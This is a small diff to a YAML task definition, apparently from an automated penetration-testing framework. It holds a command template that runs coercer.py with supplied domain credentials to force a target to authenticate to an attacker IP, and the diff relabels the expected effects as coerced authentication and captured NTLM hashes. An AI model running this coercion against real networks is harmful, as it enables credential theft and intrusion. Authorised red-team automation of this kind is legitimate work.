@@ -8,9 +8,10 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: python3 coercer.py coerce -u '{username}' -p '{password}' -d {domain}
   -t {target_ip} -l {attacker_ip}
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- coerced_auth
+- ntlm_captured
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
